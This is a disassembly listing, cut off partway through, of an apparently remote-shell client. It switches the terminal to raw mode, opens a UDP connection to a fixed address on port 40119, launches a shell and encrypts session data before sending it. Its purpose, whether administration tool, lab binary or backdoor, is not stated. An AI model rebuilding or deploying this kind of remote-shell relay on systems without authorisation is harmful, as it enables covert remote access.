000000000040115d <sighandler>:
  40115d:	55                   	push   %rbp
  40115e:	48 89 e5             	mov    %rsp,%rbp
  401161:	48 83 ec 10          	sub    $0x10,%rsp
  401165:	89 7d fc             	mov    %edi,-0x4(%rbp)
  401168:	83 7d fc 1c          	cmpl   $0x1c,-0x4(%rbp)
  40116c:	75 19                	jne    401187 <sighandler+0x2a>
  40116e:	c7 05 6c 80 20 00 01 	movl   $0x1,0x20806c(%rip)        # 6091e4 <got_sigwinch>
  401175:	00 00 00 
  401178:	8b 45 fc             	mov    -0x4(%rbp),%eax
  40117b:	be 5d 11 40 00       	mov    $0x40115d,%esi
  401180:	89 c7                	mov    %eax,%edi
  401182:	e8 b9 fd ff ff       	callq  400f40 <signal@plt>
  401187:	83 7d fc 11          	cmpl   $0x11,-0x4(%rbp)
  40118b:	75 0a                	jne    401197 <sighandler+0x3a>
  40118d:	c7 05 51 80 20 00 01 	movl   $0x1,0x208051(%rip)        # 6091e8 <got_sigchld>
  401194:	00 00 00 
  401197:	c9                   	leaveq 
  401198:	c3                   	retq   

0000000000401199 <setup_terminal>:
  401199:	55                   	push   %rbp
  40119a:	48 89 e5             	mov    %rsp,%rbp
  40119d:	53                   	push   %rbx
  40119e:	48 83 ec 78          	sub    $0x78,%rsp
  4011a2:	89 7d 8c             	mov    %edi,-0x74(%rbp)
  4011a5:	48 89 75 80          	mov    %rsi,-0x80(%rbp)
  4011a9:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
  4011b0:	00 00 
  4011b2:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
  4011b6:	31 c0                	xor    %eax,%eax
  4011b8:	c7 45 9c 00 00 00 00 	movl   $0x0,-0x64(%rbp)
  4011bf:	48 8b 45 80          	mov    -0x80(%rbp),%rax
  4011c3:	48 83 c0 18          	add    $0x18,%rax
  4011c7:	48 89 c6             	mov    %rax,%rsi
  4011ca:	bf 00 00 00 00       	mov    $0x0,%edi
  4011cf:	e8 1c fe ff ff       	callq  400ff0 <tcgetattr@plt>
  4011d4:	89 45 9c             	mov    %eax,-0x64(%rbp)
  4011d7:	83 7d 9c 00          	cmpl   $0x0,-0x64(%rbp)
  4011db:	74 5a                	je     401237 <setup_terminal+0x9e>
  4011dd:	48 8d 45 a0          	lea    -0x60(%rbp),%rax
  4011e1:	48 89 c7             	mov    %rax,%rdi
  4011e4:	e8 9c 1a 00 00       	callq  402c85 <pretty_time>
  4011e9:	48 8d 45 a0          	lea    -0x60(%rbp),%rax
  4011ed:	48 89 c2             	mov    %rax,%rdx
  4011f0:	be c1 78 40 00       	mov    $0x4078c1,%esi
  4011f5:	bf c5 78 40 00       	mov    $0x4078c5,%edi
  4011fa:	b8 00 00 00 00       	mov    $0x0,%eax
  4011ff:	e8 6c fc ff ff       	callq  400e70 <printf@plt>
  401204:	be 50 7b 40 00       	mov    $0x407b50,%esi
  401209:	bf cf 78 40 00       	mov    $0x4078cf,%edi
  40120e:	b8 00 00 00 00       	mov    $0x0,%eax
  401213:	e8 58 fc ff ff       	callq  400e70 <printf@plt>
  401218:	e8 c3 fb ff ff       	callq  400de0 <__errno_location@plt>
  40121d:	8b 00                	mov    (%rax),%eax
  40121f:	89 c6                	mov    %eax,%esi
  401221:	bf d8 78 40 00       	mov    $0x4078d8,%edi
  401226:	b8 00 00 00 00       	mov    $0x0,%eax
  40122b:	e8 40 fc ff ff       	callq  400e70 <printf@plt>
  401230:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  401235:	eb 7e                	jmp    4012b5 <setup_terminal+0x11c>
  401237:	48 8b 45 80          	mov    -0x80(%rbp),%rax
  40123b:	48 8d 48 18          	lea    0x18(%rax),%rcx
  40123f:	48 8d 45 a0          	lea    -0x60(%rbp),%rax
  401243:	ba 3c 00 00 00       	mov    $0x3c,%edx
  401248:	48 89 ce             	mov    %rcx,%rsi
  40124b:	48 89 c7             	mov    %rax,%rdi
  40124e:	e8 0d fd ff ff       	callq  400f60 <memcpy@plt>
  401253:	48 8b 45 80          	mov    -0x80(%rbp),%rax
  401257:	48 8d 50 18          	lea    0x18(%rax),%rdx
  40125b:	8b 45 8c             	mov    -0x74(%rbp),%eax
  40125e:	be 00 00 00 00       	mov    $0x0,%esi
  401263:	89 c7                	mov    %eax,%edi
  401265:	e8 96 fd ff ff       	callq  401000 <tcsetattr@plt>
  40126a:	8b 45 a0             	mov    -0x60(%rbp),%eax
  40126d:	83 c8 04             	or     $0x4,%eax
  401270:	89 45 a0             	mov    %eax,-0x60(%rbp)
  401273:	8b 45 a0             	mov    -0x60(%rbp),%eax
  401276:	25 1f e2 ff ff       	and    $0xffffe21f,%eax
  40127b:	89 45 a0             	mov    %eax,-0x60(%rbp)
  40127e:	8b 45 ac             	mov    -0x54(%rbp),%eax
  401281:	25 84 7f ff ff       	and    $0xffff7f84,%eax
  401286:	89 45 ac             	mov    %eax,-0x54(%rbp)
  401289:	8b 45 a4             	mov    -0x5c(%rbp),%eax
  40128c:	83 e0 fe             	and    $0xfffffffe,%eax
  40128f:	89 45 a4             	mov    %eax,-0x5c(%rbp)
  401292:	c6 45 b7 01          	movb   $0x1,-0x49(%rbp)
  401296:	c6 45 b6 00          	movb   $0x0,-0x4a(%rbp)
  40129a:	48 8d 45 a0          	lea    -0x60(%rbp),%rax
  40129e:	48 89 c2             	mov    %rax,%rdx
  4012a1:	be 00 00 00 00       	mov    $0x0,%esi
  4012a6:	bf 00 00 00 00       	mov    $0x0,%edi
  4012ab:	e8 50 fd ff ff       	callq  401000 <tcsetattr@plt>
  4012b0:	b8 00 00 00 00       	mov    $0x0,%eax
  4012b5:	48 8b 5d e8          	mov    -0x18(%rbp),%rbx
  4012b9:	64 48 33 1c 25 28 00 	xor    %fs:0x28,%rbx
  4012c0:	00 00 
  4012c2:	74 05                	je     4012c9 <setup_terminal+0x130>
  4012c4:	e8 67 fb ff ff       	callq  400e30 <__stack_chk_fail@plt>
  4012c9:	48 83 c4 78          	add    $0x78,%rsp
  4012cd:	5b                   	pop    %rbx
  4012ce:	5d                   	pop    %rbp
  4012cf:	c3                   	retq   

00000000004012d0 <reset_terminal>:
  4012d0:	55                   	push   %rbp
  4012d1:	48 89 e5             	mov    %rsp,%rbp
  4012d4:	48 83 ec 10          	sub    $0x10,%rsp
  4012d8:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
  4012dc:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4012e0:	48 83 c0 18          	add    $0x18,%rax
  4012e4:	48 89 c2             	mov    %rax,%rdx
  4012e7:	be 00 00 00 00       	mov    $0x0,%esi
  4012ec:	bf 00 00 00 00       	mov    $0x0,%edi
  4012f1:	e8 0a fd ff ff       	callq  401000 <tcsetattr@plt>
  4012f6:	c9                   	leaveq 
  4012f7:	c3                   	retq   

00000000004012f8 <create_server_connection>:
  4012f8:	55                   	push   %rbp
  4012f9:	48 89 e5             	mov    %rsp,%rbp
  4012fc:	48 83 ec 30          	sub    $0x30,%rsp
  401300:	48 89 7d d8          	mov    %rdi,-0x28(%rbp)
  401304:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
  40130b:	00 00 
  40130d:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  401311:	31 c0                	xor    %eax,%eax
  401313:	ba 11 00 00 00       	mov    $0x11,%edx
  401318:	be 02 00 00 00       	mov    $0x2,%esi
  40131d:	bf 02 00 00 00       	mov    $0x2,%edi
  401322:	e8 39 fd ff ff       	callq  401060 <socket@plt>
  401327:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
  40132b:	89 02                	mov    %eax,(%rdx)
  40132d:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  401331:	8b 00                	mov    (%rax),%eax
  401333:	85 c0                	test   %eax,%eax
  401335:	79 5a                	jns    401391 <create_server_connection+0x99>
  401337:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
  40133b:	48 89 c7             	mov    %rax,%rdi
  40133e:	e8 42 19 00 00       	callq  402c85 <pretty_time>
  401343:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
  401347:	48 89 c2             	mov    %rax,%rdx
  40134a:	be c1 78 40 00       	mov    $0x4078c1,%esi
  40134f:	bf c5 78 40 00       	mov    $0x4078c5,%edi
  401354:	b8 00 00 00 00       	mov    $0x0,%eax
  401359:	e8 12 fb ff ff       	callq  400e70 <printf@plt>
  40135e:	be 60 7b 40 00       	mov    $0x407b60,%esi
  401363:	bf cf 78 40 00       	mov    $0x4078cf,%edi
  401368:	b8 00 00 00 00       	mov    $0x0,%eax
  40136d:	e8 fe fa ff ff       	callq  400e70 <printf@plt>
  401372:	e8 69 fa ff ff       	callq  400de0 <__errno_location@plt>
  401377:	8b 00                	mov    (%rax),%eax
  401379:	89 c6                	mov    %eax,%esi
  40137b:	bf ff 78 40 00       	mov    $0x4078ff,%edi
  401380:	b8 00 00 00 00       	mov    $0x0,%eax
  401385:	e8 e6 fa ff ff       	callq  400e70 <printf@plt>
  40138a:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40138f:	eb 41                	jmp    4013d2 <create_server_connection+0xda>
  401391:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  401395:	66 c7 40 04 02 00    	movw   $0x2,0x4(%rax)
  40139b:	bf b7 9c 00 00       	mov    $0x9cb7,%edi
  4013a0:	e8 ab fa ff ff       	callq  400e50 <htons@plt>
  4013a5:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
  4013a9:	66 89 42 06          	mov    %ax,0x6(%rdx)
  4013ad:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  4013b1:	48 83 c0 08          	add    $0x8,%rax
  4013b5:	48 89 c6             	mov    %rax,%rsi
  4013b8:	bf 1a 79 40 00       	mov    $0x40791a,%edi
  4013bd:	e8 ee fb ff ff       	callq  400fb0 <inet_aton@plt>
  4013c2:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  4013c6:	c7 40 14 00 00 00 00 	movl   $0x0,0x14(%rax)
  4013cd:	b8 00 00 00 00       	mov    $0x0,%eax
  4013d2:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
  4013d6:	64 48 33 0c 25 28 00 	xor    %fs:0x28,%rcx
  4013dd:	00 00 
  4013df:	74 05                	je     4013e6 <create_server_connection+0xee>
  4013e1:	e8 4a fa ff ff       	callq  400e30 <__stack_chk_fail@plt>
  4013e6:	c9                   	leaveq 
  4013e7:	c3                   	retq   

00000000004013e8 <create_real_shell_run_cmd>:
  4013e8:	55                   	push   %rbp
  4013e9:	48 89 e5             	mov    %rsp,%rbp
  4013ec:	53                   	push   %rbx
  4013ed:	48 83 ec 68          	sub    $0x68,%rsp
  4013f1:	89 7d ac             	mov    %edi,-0x54(%rbp)
  4013f4:	48 89 75 a0          	mov    %rsi,-0x60(%rbp)
  4013f8:	48 89 55 98          	mov    %rdx,-0x68(%rbp)
  4013fc:	89 4d a8             	mov    %ecx,-0x58(%rbp)
  4013ff:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
  401406:	00 00 
  401408:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
  40140c:	31 c0                	xor    %eax,%eax
  40140e:	c7 45 c4 00 00 00 00 	movl   $0x0,-0x3c(%rbp)
  401415:	c7 45 bc 00 00 00 00 	movl   $0x0,-0x44(%rbp)
  40141c:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
  401420:	48 8b 00             	mov    (%rax),%rax
  401423:	be 2f 00 00 00       	mov    $0x2f,%esi
  401428:	48 89 c7             	mov    %rax,%rdi
  40142b:	e8 60 fa ff ff       	callq  400e90 <strrchr@plt>
  401430:	48 83 c0 01          	add    $0x1,%rax
  401434:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
  401438:	c7 45 c0 0b 00 00 00 	movl   $0xb,-0x40(%rbp)
  40143f:	8b 45 bc             	mov    -0x44(%rbp),%eax
  401442:	8b 55 a8             	mov    -0x58(%rbp),%edx
  401445:	29 c2                	sub    %eax,%edx
  401447:	89 d0                	mov    %edx,%eax
  401449:	3b 45 c0             	cmp    -0x40(%rbp),%eax
  40144c:	7d 05                	jge    401453 <create_real_shell_run_cmd+0x6b>
  40144e:	e9 d2 00 00 00       	jmpq   401525 <create_real_shell_run_cmd+0x13d>
  401453:	8b 45 c0             	mov    -0x40(%rbp),%eax
  401456:	48 98                	cltq   
  401458:	8b 55 bc             	mov    -0x44(%rbp),%edx
  40145b:	48 63 ca             	movslq %edx,%rcx
  40145e:	48 8b 55 98          	mov    -0x68(%rbp),%rdx
  401462:	48 01 d1             	add    %rdx,%rcx
  401465:	48 89 c2             	mov    %rax,%rdx
  401468:	be 24 79 40 00       	mov    $0x407924,%esi
  40146d:	48 89 cf             	mov    %rcx,%rdi
  401470:	e8 eb fa ff ff       	callq  400f60 <memcpy@plt>
  401475:	8b 45 c0             	mov    -0x40(%rbp),%eax
  401478:	01 45 bc             	add    %eax,-0x44(%rbp)
  40147b:	8b 45 bc             	mov    -0x44(%rbp),%eax
  40147e:	48 98                	cltq   
  401480:	48 8d 50 ff          	lea    -0x1(%rax),%rdx
  401484:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  401488:	48 01 d0             	add    %rdx,%rax
  40148b:	0f b6 00             	movzbl (%rax),%eax
  40148e:	3c 2f                	cmp    $0x2f,%al
  401490:	74 16                	je     4014a8 <create_real_shell_run_cmd+0xc0>
  401492:	8b 45 bc             	mov    -0x44(%rbp),%eax
  401495:	8d 50 01             	lea    0x1(%rax),%edx
  401498:	89 55 bc             	mov    %edx,-0x44(%rbp)
  40149b:	48 63 d0             	movslq %eax,%rdx
  40149e:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  4014a2:	48 01 d0             	add    %rdx,%rax
  4014a5:	c6 00 2f             	movb   $0x2f,(%rax)
  4014a8:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  4014ac:	48 89 c7             	mov    %rax,%rdi
  4014af:	e8 6c f9 ff ff       	callq  400e20 <strlen@plt>
  4014b4:	89 45 c0             	mov    %eax,-0x40(%rbp)
  4014b7:	8b 45 bc             	mov    -0x44(%rbp),%eax
  4014ba:	8b 55 a8             	mov    -0x58(%rbp),%edx
  4014bd:	29 c2                	sub    %eax,%edx
  4014bf:	89 d0                	mov    %edx,%eax
  4014c1:	3b 45 c0             	cmp    -0x40(%rbp),%eax
  4014c4:	7d 02                	jge    4014c8 <create_real_shell_run_cmd+0xe0>
  4014c6:	eb 5d                	jmp    401525 <create_real_shell_run_cmd+0x13d>
  4014c8:	8b 45 c0             	mov    -0x40(%rbp),%eax
  4014cb:	48 63 d0             	movslq %eax,%rdx
  4014ce:	8b 45 bc             	mov    -0x44(%rbp),%eax
  4014d1:	48 63 c8             	movslq %eax,%rcx
  4014d4:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  4014d8:	48 01 c1             	add    %rax,%rcx
  4014db:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  4014df:	48 89 c6             	mov    %rax,%rsi
  4014e2:	48 89 cf             	mov    %rcx,%rdi
  4014e5:	e8 76 fa ff ff       	callq  400f60 <memcpy@plt>
  4014ea:	8b 45 c0             	mov    -0x40(%rbp),%eax
  4014ed:	01 45 bc             	add    %eax,-0x44(%rbp)
  4014f0:	c7 45 c0 01 00 00 00 	movl   $0x1,-0x40(%rbp)
  4014f7:	8b 45 bc             	mov    -0x44(%rbp),%eax
  4014fa:	8b 55 a8             	mov    -0x58(%rbp),%edx
  4014fd:	29 c2                	sub    %eax,%edx
  4014ff:	89 d0                	mov    %edx,%eax
  401501:	3b 45 c0             	cmp    -0x40(%rbp),%eax
  401504:	7d 02                	jge    401508 <create_real_shell_run_cmd+0x120>
  401506:	eb 1d                	jmp    401525 <create_real_shell_run_cmd+0x13d>
  401508:	8b 45 bc             	mov    -0x44(%rbp),%eax
  40150b:	8d 50 01             	lea    0x1(%rax),%edx
  40150e:	89 55 bc             	mov    %edx,-0x44(%rbp)
  401511:	48 63 d0             	movslq %eax,%rdx
  401514:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  401518:	48 01 d0             	add    %rdx,%rax
  40151b:	c6 00 00             	movb   $0x0,(%rax)
  40151e:	b8 00 00 00 00       	mov    $0x0,%eax
  401523:	eb 5c                	jmp    401581 <create_real_shell_run_cmd+0x199>
  401525:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
  401529:	48 89 c7             	mov    %rax,%rdi
  40152c:	e8 54 17 00 00       	callq  402c85 <pretty_time>
  401531:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
  401535:	48 89 c2             	mov    %rax,%rdx
  401538:	be c1 78 40 00       	mov    $0x4078c1,%esi
  40153d:	bf c5 78 40 00       	mov    $0x4078c5,%edi
  401542:	b8 00 00 00 00       	mov    $0x0,%eax
  401547:	e8 24 f9 ff ff       	callq  400e70 <printf@plt>
  40154c:	be 80 7b 40 00       	mov    $0x407b80,%esi
  401551:	bf cf 78 40 00       	mov    $0x4078cf,%edi
  401556:	b8 00 00 00 00       	mov    $0x0,%eax
  40155b:	e8 10 f9 ff ff       	callq  400e70 <printf@plt>
  401560:	8b 45 bc             	mov    -0x44(%rbp),%eax
  401563:	8b 55 a8             	mov    -0x58(%rbp),%edx
  401566:	29 c2                	sub    %eax,%edx
  401568:	8b 45 c0             	mov    -0x40(%rbp),%eax
  40156b:	89 c6                	mov    %eax,%esi
  40156d:	bf 30 79 40 00       	mov    $0x407930,%edi
  401572:	b8 00 00 00 00       	mov    $0x0,%eax
  401577:	e8 f4 f8 ff ff       	callq  400e70 <printf@plt>
  40157c:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  401581:	48 8b 5d e8          	mov    -0x18(%rbp),%rbx
  401585:	64 48 33 1c 25 28 00 	xor    %fs:0x28,%rbx
  40158c:	00 00 
  40158e:	74 05                	je     401595 <create_real_shell_run_cmd+0x1ad>
  401590:	e8 9b f8 ff ff       	callq  400e30 <__stack_chk_fail@plt>
  401595:	48 83 c4 68          	add    $0x68,%rsp
  401599:	5b                   	pop    %rbx
  40159a:	5d                   	pop    %rbp
  40159b:	c3                   	retq   

000000000040159c <encrypt_and_send>:
  40159c:	55                   	push   %rbp
  40159d:	48 89 e5             	mov    %rsp,%rbp
  4015a0:	53                   	push   %rbx
  4015a1:	48 81 ec c8 25 00 00 	sub    $0x25c8,%rsp
  4015a8:	48 89 bd 38 da ff ff 	mov    %rdi,-0x25c8(%rbp)
  4015af:	48 89 b5 30 da ff ff 	mov    %rsi,-0x25d0(%rbp)
  4015b6:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
  4015bd:	00 00 
  4015bf:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
  4015c3:	31 c0                	xor    %eax,%eax
  4015c5:	c7 85 48 da ff ff 00 	movl   $0x0,-0x25b8(%rbp)
  4015cc:	00 00 00 
  4015cf:	c7 85 4c da ff ff 00 	movl   $0x0,-0x25b4(%rbp)
  4015d6:	00 00 00 
  4015d9:	c7 85 40 da ff ff 00 	movl   $0x0,-0x25c0(%rbp)
  4015e0:	00 00 00 
  4015e3:	e9 11 0b 00 00       	jmpq   4020f9 <encrypt_and_send+0xb5d>
  4015e8:	48 8b 85 30 da ff ff 	mov    -0x25d0(%rbp),%rax
  4015ef:	8b 40 60             	mov    0x60(%rax),%eax
  4015f2:	2b 85 40 da ff ff    	sub    -0x25c0(%rbp),%eax
  4015f8:	ba 00 02 00 00       	mov    $0x200,%edx
  4015fd:	3d 00 02 00 00       	cmp    $0x200,%eax
  401602:	0f 4f c2             	cmovg  %edx,%eax
  401605:	89 85 50 da ff ff    	mov    %eax,-0x25b0(%rbp)
  40160b:	c7 85 44 da ff ff 00 	movl   $0x0,-0x25bc(%rbp)
  401612:	00 00 00 
  401615:	eb 27                	jmp    40163e <encrypt_and_send+0xa2>
  401617:	8b 9d 48 da ff ff    	mov    -0x25b8(%rbp),%ebx
  40161d:	8d 43 01             	lea    0x1(%rbx),%eax
  401620:	89 85 48 da ff ff    	mov    %eax,-0x25b8(%rbp)
  401626:	e8 15 fa ff ff       	callq  401040 <rand@plt>
  40162b:	89 c2                	mov    %eax,%edx
  40162d:	48 63 c3             	movslq %ebx,%rax
  401630:	88 94 05 40 df ff ff 	mov    %dl,-0x20c0(%rbp,%rax,1)
  401637:	83 85 44 da ff ff 01 	addl   $0x1,-0x25bc(%rbp)
  40163e:	83 bd 44 da ff ff 0f 	cmpl   $0xf,-0x25bc(%rbp)
  401645:	7e d0                	jle    401617 <encrypt_and_send+0x7b>
  401647:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  40164d:	8d 50 01             	lea    0x1(%rax),%edx
  401650:	89 95 4c da ff ff    	mov    %edx,-0x25b4(%rbp)
  401656:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  40165c:	8d 0c 10             	lea    (%rax,%rdx,1),%ecx
  40165f:	48 8b 85 30 da ff ff 	mov    -0x25d0(%rbp),%rax
  401666:	48 8b 00             	mov    (%rax),%rax
  401669:	89 c2                	mov    %eax,%edx
  40166b:	48 63 c1             	movslq %ecx,%rax
  40166e:	88 94 05 40 df ff ff 	mov    %dl,-0x20c0(%rbp,%rax,1)
  401675:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  40167b:	8d 50 01             	lea    0x1(%rax),%edx
  40167e:	89 95 4c da ff ff    	mov    %edx,-0x25b4(%rbp)
  401684:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  40168a:	8d 0c 10             	lea    (%rax,%rdx,1),%ecx
  40168d:	48 8b 85 30 da ff ff 	mov    -0x25d0(%rbp),%rax
  401694:	48 8b 00             	mov    (%rax),%rax
  401697:	48 c1 f8 08          	sar    $0x8,%rax
  40169b:	89 c2                	mov    %eax,%edx
  40169d:	48 63 c1             	movslq %ecx,%rax
  4016a0:	88 94 05 40 df ff ff 	mov    %dl,-0x20c0(%rbp,%rax,1)
  4016a7:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  4016ad:	8d 50 01             	lea    0x1(%rax),%edx
  4016b0:	89 95 4c da ff ff    	mov    %edx,-0x25b4(%rbp)
  4016b6:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  4016bc:	8d 0c 10             	lea    (%rax,%rdx,1),%ecx
  4016bf:	48 8b 85 30 da ff ff 	mov    -0x25d0(%rbp),%rax
  4016c6:	48 8b 00             	mov    (%rax),%rax
  4016c9:	48 c1 f8 10          	sar    $0x10,%rax
  4016cd:	89 c2                	mov    %eax,%edx
  4016cf:	48 63 c1             	movslq %ecx,%rax
  4016d2:	88 94 05 40 df ff ff 	mov    %dl,-0x20c0(%rbp,%rax,1)
  4016d9:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  4016df:	8d 50 01             	lea    0x1(%rax),%edx
  4016e2:	89 95 4c da ff ff    	mov    %edx,-0x25b4(%rbp)
  4016e8:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  4016ee:	8d 0c 10             	lea    (%rax,%rdx,1),%ecx
  4016f1:	48 8b 85 30 da ff ff 	mov    -0x25d0(%rbp),%rax
  4016f8:	48 8b 00             	mov    (%rax),%rax
  4016fb:	48 c1 f8 18          	sar    $0x18,%rax
  4016ff:	89 c2                	mov    %eax,%edx
  401701:	48 63 c1             	movslq %ecx,%rax
  401704:	88 94 05 40 df ff ff 	mov    %dl,-0x20c0(%rbp,%rax,1)
  40170b:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401711:	8d 50 01             	lea    0x1(%rax),%edx
  401714:	89 95 4c da ff ff    	mov    %edx,-0x25b4(%rbp)
  40171a:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  401720:	8d 0c 10             	lea    (%rax,%rdx,1),%ecx
  401723:	48 8b 85 30 da ff ff 	mov    -0x25d0(%rbp),%rax
  40172a:	48 8b 40 08          	mov    0x8(%rax),%rax
  40172e:	89 c2                	mov    %eax,%edx
  401730:	48 63 c1             	movslq %ecx,%rax
  401733:	88 94 05 40 df ff ff 	mov    %dl,-0x20c0(%rbp,%rax,1)
  40173a:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401740:	8d 50 01             	lea    0x1(%rax),%edx
  401743:	89 95 4c da ff ff    	mov    %edx,-0x25b4(%rbp)
  401749:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  40174f:	8d 0c 10             	lea    (%rax,%rdx,1),%ecx
  401752:	48 8b 85 30 da ff ff 	mov    -0x25d0(%rbp),%rax
  401759:	48 8b 40 08          	mov    0x8(%rax),%rax
  40175d:	48 c1 f8 08          	sar    $0x8,%rax
  401761:	89 c2                	mov    %eax,%edx
  401763:	48 63 c1             	movslq %ecx,%rax
  401766:	88 94 05 40 df ff ff 	mov    %dl,-0x20c0(%rbp,%rax,1)
  40176d:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401773:	8d 50 01             	lea    0x1(%rax),%edx
  401776:	89 95 4c da ff ff    	mov    %edx,-0x25b4(%rbp)
  40177c:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  401782:	8d 0c 10             	lea    (%rax,%rdx,1),%ecx
  401785:	48 8b 85 30 da ff ff 	mov    -0x25d0(%rbp),%rax
  40178c:	48 8b 40 08          	mov    0x8(%rax),%rax
  401790:	48 c1 f8 10          	sar    $0x10,%rax
  401794:	89 c2                	mov    %eax,%edx
  401796:	48 63 c1             	movslq %ecx,%rax
  401799:	88 94 05 40 df ff ff 	mov    %dl,-0x20c0(%rbp,%rax,1)
  4017a0:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  4017a6:	8d 50 01             	lea    0x1(%rax),%edx
  4017a9:	89 95 4c da ff ff    	mov    %edx,-0x25b4(%rbp)
  4017af:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  4017b5:	8d 0c 10             	lea    (%rax,%rdx,1),%ecx
  4017b8:	48 8b 85 30 da ff ff 	mov    -0x25d0(%rbp),%rax
  4017bf:	48 8b 40 08          	mov    0x8(%rax),%rax
  4017c3:	48 c1 f8 18          	sar    $0x18,%rax
  4017c7:	89 c2                	mov    %eax,%edx
  4017c9:	48 63 c1             	movslq %ecx,%rax
  4017cc:	88 94 05 40 df ff ff 	mov    %dl,-0x20c0(%rbp,%rax,1)
  4017d3:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  4017d9:	8d 50 01             	lea    0x1(%rax),%edx
  4017dc:	89 95 4c da ff ff    	mov    %edx,-0x25b4(%rbp)
  4017e2:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  4017e8:	8d 0c 10             	lea    (%rax,%rdx,1),%ecx
  4017eb:	48 8b 85 30 da ff ff 	mov    -0x25d0(%rbp),%rax
  4017f2:	8b 40 54             	mov    0x54(%rax),%eax
  4017f5:	89 c2                	mov    %eax,%edx
  4017f7:	48 63 c1             	movslq %ecx,%rax
  4017fa:	88 94 05 40 df ff ff 	mov    %dl,-0x20c0(%rbp,%rax,1)
  401801:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401807:	8d 50 01             	lea    0x1(%rax),%edx
  40180a:	89 95 4c da ff ff    	mov    %edx,-0x25b4(%rbp)
  401810:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  401816:	8d 0c 10             	lea    (%rax,%rdx,1),%ecx
  401819:	48 8b 85 30 da ff ff 	mov    -0x25d0(%rbp),%rax
  401820:	8b 40 54             	mov    0x54(%rax),%eax
  401823:	c1 f8 08             	sar    $0x8,%eax
  401826:	89 c2                	mov    %eax,%edx
  401828:	48 63 c1             	movslq %ecx,%rax
  40182b:	88 94 05 40 df ff ff 	mov    %dl,-0x20c0(%rbp,%rax,1)
  401832:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401838:	8d 50 01             	lea    0x1(%rax),%edx
  40183b:	89 95 4c da ff ff    	mov    %edx,-0x25b4(%rbp)
  401841:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  401847:	8d 0c 10             	lea    (%rax,%rdx,1),%ecx
  40184a:	48 8b 85 30 da ff ff 	mov    -0x25d0(%rbp),%rax
  401851:	8b 40 58             	mov    0x58(%rax),%eax
  401854:	89 c2                	mov    %eax,%edx
  401856:	48 63 c1             	movslq %ecx,%rax
  401859:	88 94 05 40 df ff ff 	mov    %dl,-0x20c0(%rbp,%rax,1)
  401860:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401866:	8d 50 01             	lea    0x1(%rax),%edx
  401869:	89 95 4c da ff ff    	mov    %edx,-0x25b4(%rbp)
  40186f:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  401875:	8d 0c 10             	lea    (%rax,%rdx,1),%ecx
  401878:	48 8b 85 30 da ff ff 	mov    -0x25d0(%rbp),%rax
  40187f:	8b 40 58             	mov    0x58(%rax),%eax
  401882:	c1 f8 08             	sar    $0x8,%eax
  401885:	89 c2                	mov    %eax,%edx
  401887:	48 63 c1             	movslq %ecx,%rax
  40188a:	88 94 05 40 df ff ff 	mov    %dl,-0x20c0(%rbp,%rax,1)
  401891:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401897:	8d 50 01             	lea    0x1(%rax),%edx
  40189a:	89 95 4c da ff ff    	mov    %edx,-0x25b4(%rbp)
  4018a0:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  4018a6:	8d 0c 10             	lea    (%rax,%rdx,1),%ecx
  4018a9:	48 8b 85 30 da ff ff 	mov    -0x25d0(%rbp),%rax
  4018b0:	8b 40 5c             	mov    0x5c(%rax),%eax
  4018b3:	89 c2                	mov    %eax,%edx
